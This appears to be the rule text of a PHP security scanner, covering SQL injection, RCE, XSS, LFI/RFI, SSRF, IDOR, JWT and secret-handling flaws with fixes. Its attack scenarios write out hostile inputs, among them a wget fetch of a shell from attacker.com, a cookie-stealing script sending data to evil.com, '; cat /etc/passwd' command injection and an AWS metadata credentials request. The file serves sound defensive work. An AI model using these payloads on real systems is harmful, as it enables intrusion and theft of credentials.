rules.name: SQL Injection – string concatenation in query
rules.why: User input from $_GET/$_POST is concatenated directly into the SQL query without sanitisation.
rules.scenario: An attacker enters ' OR '1'='1 in a form field and gains access to the entire database or can delete tables.
rules.fix: Use PDO with prepared statements: $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $stmt->execute([$id]);

rules.name: SQL Injection – direct variable interpolation
rules.why: PHP variables from superglobals (incl. $_SESSION) are concatenated directly into the SQL string without sanitisation.
rules.scenario: An attacker sends id=1+OR+1=1 as a GET parameter. The SQL string becomes "WHERE id=1 OR 1=1" and returns all rows.
rules.fix: Use parameterised queries: $stmt = sqlsrv_query($link, "SELECT ... WHERE id=?", array($_POST["id"]));

rules.name: SQL Injection – variable interpolation in SQL string
rules.why: PHP variables are interpolated directly into the SQL string via double quotes.
rules.scenario: An attacker sends name=" OR 1=1-- and the SQL query returns all records in the table.
rules.fix: Never use variables directly in SQL strings. Use prepared statements with ? as placeholders.

rules.name: SQL Injection – tainted variable concatenated into query
rules.why: A superglobal ($_GET/$_POST) is assigned to a local variable which is then concatenated into SQL without sanitisation.
rules.scenario: Developer assigns $id = $_GET["id"] then uses $query = "SELECT ... WHERE id = " . $id — still vulnerable to injection.
rules.fix: Use parameterised queries: $stmt = $pdo->prepare("SELECT * FROM t WHERE id = ?"); $stmt->execute([$_GET["id"]]);

rules.name: SQL Injection – tainted variable interpolated in SQL string
rules.why: A variable assigned from user input ($_GET/$_POST) is interpolated directly into a SQL string. The SQL keyword in the string confirms injection context.
rules.scenario: Developer assigns $username = $_POST["username"] then interpolates it in SQL — attacker can inject arbitrary SQL.
rules.fix: Use parameterised queries. Never interpolate variables into SQL strings.

rules.name: Remote Code Execution – eval with user input
rules.why: eval() executes arbitrary PHP code. With user input as the data source, RCE is inevitable.
rules.scenario: Attacker sends PHP code as parameter: ?code=system("wget attacker.com/shell.php"). The server executes it.
rules.fix: Never use eval() with external input. Replace with whitelisted operations or a proper template engine.

rules.name: Command Injection – shell_exec / system with user input
rules.why: Shell commands are built with direct user input and executed on the server.
rules.scenario: Attacker sends "; cat /etc/passwd" as a filename parameter. The server returns the password file.
rules.fix: Use escapeshellarg() for all input and avoid shell functions entirely where possible.

rules.name: Command Injection – tainted variable in shell command
rules.why: A variable assigned from user input is concatenated into a shell command without sanitisation.
rules.scenario: Developer assigns $file = $_GET["filename"] then uses system("unzip " . $file) — attacker can inject shell commands.
rules.fix: Use escapeshellarg($file) and validate input against a whitelist before using in shell commands.

rules.name: XSS – unsanitised output of user input
rules.why: User input is written directly to HTML output without escaping.
rules.scenario: An attacker injects <script>document.location="https://evil.com?c="+document.cookie</script> via a parameter and steals cookies from visitors.
rules.fix: Always use htmlspecialchars(): echo htmlspecialchars($_GET["name"], ENT_QUOTES, "UTF-8")

rules.name: Information Disclosure – SQL query exposed on error
rules.why: The error handler prints the full SQL query or raw database error message directly in the HTTP response. An attacker receives table names, column names and SQL structure.
rules.scenario: An attacker deliberately triggers a syntax error. The response contains: "You have an error in your SQL syntax near SELECT usr, password FROM users WHERE" — the database schema is now known.
rules.fix: Log the error server-side and show a generic message: error_log(print_r(sqlsrv_errors(), true)); http_response_code(500); die("An internal error occurred.");

rules.name: Commented-out insecure code – SQL injection pattern in comment
rules.why: Commented-out code with an SQL injection pattern remains in the codebase. The code is inactive but can be re-enabled by a developer unaware of the security risk.
rules.scenario: A developer finds the commented-out code during debugging and removes the comment to "quickly test something". The code is now active and vulnerable.
rules.fix: Remove the commented-out code entirely. If the functionality is needed, implement it with prepared statements from the start.

rules.name: Password comparison with == instead of password_verify
rules.why: Loose comparisons (==) are vulnerable to type juggling attacks in PHP. password_verify() must always be used.
rules.scenario: PHP's == converts types: '0e123' == '0e456' is true because both are interpreted as 0 in scientific notation. An attacker can log in with a different password.
rules.fix: Use password_verify($input, $hash) and password_hash($password, PASSWORD_BCRYPT) for storage.

rules.name: File inclusion with user input (LFI/RFI)
rules.why: Filenames from user input are used in include/require — enabling Local/Remote File Inclusion.
rules.scenario: An attacker sends ?page=../../../../etc/passwd and the server reads and returns system files.
rules.fix: Never use user input directly in include. Whitelist allowed pages: $allowed = ["home", "about"]; if(in_array($page, $allowed)) include $page . ".php";

rules.name: File inclusion – tainted variable in include/require (LFI)
rules.why: A variable assigned from user input is used in include/require — enabling Local File Inclusion.
rules.scenario: Developer assigns $page = $_GET["page"] then calls include($page . ".php") — attacker can include sensitive files.
rules.fix: Whitelist allowed values: $allowed = ["home", "about"]; if (in_array($page, $allowed)) include $page . ".php";

rules.name: IDOR – database lookup without ownership check
rules.why: Database objects are fetched directly with an ID from the URL without checking whether the user owns the record.
rules.scenario: A user with ID 5 changes the URL from ?id=5 to ?id=3 and views another user's data.
rules.fix: Always add an ownership check: WHERE id = ? AND user_id = ? using the logged-in user's ID.

rules.name: IDOR – owner ID taken from $_POST without session verification
rules.why: Owner ID (uid/pid) can be sourced from POST data controlled by the client. An attacker can send arbitrary IDs and operate on other users' data.
rules.scenario: A mobile client sends userID=7&projectID=3. The server uses these values directly as owner IDs without verifying against the logged-in session.
rules.fix: Always verify against $_SESSION: retrieve $_SESSION["user_id"] server-side and compare with or replace the POST-supplied ID.

rules.name: Password stored in plaintext in database
rules.why: The password from the form is stored directly in the database without hashing. In the event of a database breach all users' passwords are exposed in plaintext.
rules.scenario: An attacker with SELECT access to the database dumps the entire user table and obtains all passwords in plaintext.
rules.fix: Always hash passwords with password_hash() before storage: $hash = password_hash($_POST["password"], PASSWORD_BCRYPT); Then verify with password_verify($input, $hash).

rules.name: Sensitive operations via $_GET (password/user data in URL)
rules.why: Passwords and sensitive values in GET parameters end up in server logs, browser history, proxy logs and Referer headers.
rules.scenario: WS_addUser.php?usr=admin&password=secret123 appears in the Apache log, browser history, and is sent with the Referer header to external resources.
rules.fix: Always use POST for passwords and sensitive operations. Never send passwords as URL parameters.

rules.name: Weak password hashing algorithm (MD5/SHA1)
rules.why: MD5 and SHA1 are cryptographically broken and unsuitable for password hashing.
rules.scenario: An attacker with database access can crack MD5-hashed passwords using rainbow tables in seconds.
rules.fix: Use password_hash($password, PASSWORD_BCRYPT) and password_verify($input, $hash).

rules.name: Hardcoded database password in configuration
rules.why: The database password is hardcoded in the source code and exposed in version control.
rules.scenario: Anyone with repository access — including former employees — now has access to the production database.
rules.fix: Use an environment variable: define('DB_PASSWORD', getenv('DB_PASSWORD')); and store in .env outside git.

rules.name: JWT decoded without signature verification
rules.why: Calling JWT::decode() with a null key or empty key array skips signature verification. Any token with a valid structure is accepted regardless of who signed it.
rules.scenario: AI passes null as the key argument to JWT::decode() during prototyping. The code ships. Attacker forges a token with ["role" => "admin", "user_id" => 1] and gains admin access.
rules.fix: Always provide the key: JWT::decode($token, new Key($secretKey, "HS256")). Use firebase/php-jwt >= 6.0 which requires an explicit Key object.

rules.name: JWT algorithm "none" accepted — signature bypass
rules.why: Accepting "none" as a valid algorithm means tokens without signatures are trusted.
rules.scenario: Allowed algorithms array includes "none". Attacker takes a valid token, strips the signature, changes alg to "none" in the header, and modifies the payload. Server accepts it.
rules.fix: Use an explicit allowlist: ["HS256"] or ["RS256"]. Never include "none".

rules.name: JWT payload read by manual base64 decode — signature not verified
rules.why: Splitting a JWT on "." and base64-decoding the payload reads the claims without verifying the HMAC signature. The payload is just base64url-encoded JSON — completely attacker-controlled.
rules.scenario: Code does $parts = explode(".", $token); $payload = json_decode(base64_decode($parts[1])). Attacker creates a token with "admin": true in the payload. No signature check — any payload is trusted.
rules.fix: Use a JWT library for all token operations. Never manually decode JWT parts.

rules.name: Hardcoded API key or secret in source code
rules.why: Hardcoded secrets are exposed to everyone with repository access. Automated scanners harvest API keys from public repos within minutes of a push.
rules.scenario: $api_key = "sk-prod-abc123xyz..." committed to git. Repo becomes public. Within hours, the key is used to rack up charges on a third-party API or access customer data.
rules.fix: $api_key = getenv("API_KEY"); Store in .env (git-ignored) with vlucas/phpdotenv locally, and as environment variables in production hosting.

rules.name: Hardcoded JWT secret or HMAC key
rules.why: A hardcoded JWT signing key means tokens can be forged by anyone with source code access.
rules.scenario: JWT::encode($payload, "supersecret") in source. Attacker reads key from repo, forges tokens for any user ID or role.
rules.fix: $secret = getenv("JWT_SECRET"); JWT::encode($payload, $secret, "HS256"). Generate with: php -r "echo bin2hex(random_bytes(64));"

rules.name: Open redirect — unvalidated request parameter used in header redirect
rules.why: Concatenating user input into a Location header gives attackers full control over the redirect destination, enabling phishing attacks under your domain.
rules.scenario: header("Location: " . $_GET["next"]) after login. Attacker sends users to yoursite.com/login?next=https://evil.com. After authenticating, users land on the phishing page.
rules.fix: $next = $_GET["next"] ?? "/"; $parsed = parse_url($next); if (!empty($parsed["host"])) $next = "/"; header("Location: " . $next);

rules.name: Path traversal — user input used in file_get_contents or include
rules.why: Passing user-supplied input to file functions or include statements allows reading arbitrary files (LFI) or in some configurations executing remote code (RFI).
rules.scenario: include($_GET["page"] . ".php"). Attacker requests ?page=../../../../etc/passwd or ?page=http://evil.com/shell (RFI if allow_url_include is on).
rules.fix: $allowed = ["home", "about", "contact"]; $page = $_GET["page"] ?? "home"; if (!in_array($page, $allowed)) $page = "home"; include("pages/" . $page . ".php");

rules.name: SSRF — user-controlled URL passed to curl or file_get_contents
rules.why: SSRF via curl or file_get_contents allows attackers to make the PHP server send requests to internal services — including cloud metadata endpoints, internal APIs, Redis, and other infrastructure.
rules.scenario: curl_setopt($ch, CURLOPT_URL, $_GET["url"]) to proxy images. Attacker sends ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. Server returns AWS credentials.
rules.fix: $url = $_GET["url"]; $parsed = parse_url($url); $allowed = ["cdn.example.com", "api.example.com"]; if (!in_array($parsed["host"], $allowed)) die("Forbidden");

rules.name: Authentication based on unvalidated $_COOKIE value
rules.why: Cookie values are completely attacker-controlled — any user can set any cookie to any value using browser dev tools. Using $_COOKIE directly for authorization decisions gives attackers trivial privilege escalation.
rules.scenario: if ($_COOKIE["role"] === "admin") — attacker opens DevTools, sets cookie role=admin, reloads. Full admin access without any credentials.
rules.fix: Never trust cookie values directly for authorization. Store the role in the server-side session: $_SESSION["role"] = "admin" after verified authentication.

rules.name: PHP error display enabled — errors exposed to browser
rules.why: display_errors=1 sends PHP error messages, warnings, and notices directly to the browser response. These messages expose file paths, variable values, SQL queries, and application structure.
rules.scenario: ini_set("display_errors", 1) left in from development. A malformed request triggers a database error exposing the full file path and database name.
rules.fix: In production: ini_set("display_errors", 0); error_reporting(E_ALL); ini_set("log_errors", 1); ini_set("error_log", "/var/log/php/errors.log"); Log everything, display nothing.

rules.name: Laravel APP_DEBUG=true — debug mode in application config
rules.why: Laravel's debug mode exposes the Ignition error page which shows full stack traces, environment variables, request data, and config values on every unhandled exception.
rules.scenario: APP_DEBUG=true deployed to production. User triggers a 500 error. Ignition page reveals: DB_PASSWORD, APP_KEY, full stack trace with internal paths — fully visible to the user.
rules.fix: In config/app.php: "debug" => env("APP_DEBUG", false). Ensure .env in production has APP_DEBUG=false.

rules.name: Laravel APP_KEY hardcoded or missing — encryption key in source
rules.why: Laravel APP_KEY is used to encrypt cookies, sessions, queued jobs, and all data passed through Laravel's Crypt facade. A hardcoded or leaked key allows attackers to decrypt all encrypted application data.
rules.scenario: APP_KEY hardcoded in config/app.php, committed to git. Attacker decrypts all user session cookies and forges remember_me tokens for any user ID.
rules.fix: "key" => env("APP_KEY") — this is the Laravel default. Generate: php artisan key:generate. Store only in .env (git-ignored) and production environment variables.

rules.name: WordPress database credentials or secret keys hardcoded in wp-config
rules.why: WordPress stores database credentials and cryptographic salts directly in wp-config.php. If this file is accidentally exposed, all credentials and session signing keys are compromised.
rules.scenario: wp-config.php committed to a public GitHub repo. Attacker extracts DB_PASSWORD, connects directly to MySQL, dumps all user password hashes and personal data.
rules.fix: Load from environment: define("DB_PASSWORD", getenv("DB_PASSWORD")). Store actual values outside the webroot and outside version control.
